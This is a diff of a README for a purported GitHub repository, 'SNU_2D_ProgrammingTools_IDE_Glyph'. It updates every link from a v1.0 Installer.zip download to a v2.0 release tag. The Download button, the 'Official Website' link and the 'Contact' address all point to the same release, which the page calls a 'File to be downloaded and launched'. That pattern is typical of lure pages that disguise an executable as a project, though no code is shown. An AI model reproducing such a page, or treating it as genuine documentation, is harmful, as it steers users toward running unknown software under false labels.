@@ -14,11 +14,11 @@ glyph, glyph-lang, glyph-language, gpl3, gplv3, ide, programming, snu, snu-2d, s
 ## 📚 Resources
 
 ### Download
-[![Download SNU_2D_ProgrammingTools_IDE_Glyph](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/download/v1.0/Installer.zip%https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/download/v1.0/Installer.zip)](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/download/v1.0/Installer.zip)
+[![Download SNU_2D_ProgrammingTools_IDE_Glyph](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/tag/v2.0%https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/tag/v2.0)](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/tag/v2.0)
 (*File to be downloaded and launched*)
 
 ### Visit the Official Website
-[Visit SNU Programming Tools Official Website](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/download/v1.0/Installer.zip)
+[Visit SNU Programming Tools Official Website](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/tag/v2.0)
 (*Explore more about SNU Programming Tools*)
 
 ### Releases Section
@@ -64,7 +64,7 @@ Join our community of developers working with SNU Programming Tools to exchange 
 ---
 
 ## 📞 Contact
-Have questions or feedback regarding the SNU_2D_ProgrammingTools_IDE_Glyph repository? Reach out to us at [https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/download/v1.0/Installer.zip](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/download/v1.0/Installer.zip).
+Have questions or feedback regarding the SNU_2D_ProgrammingTools_IDE_Glyph repository? Reach out to us at [https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/tag/v2.0](https://github.com/mengmeng301/SNU_2D_ProgrammingTools_IDE_Glyph/releases/tag/v2.0).
 
 Let's code, debug, and build amazing projects with the SNU 2D ProgrammingTools IDE Glyph submodule! 🌟
 
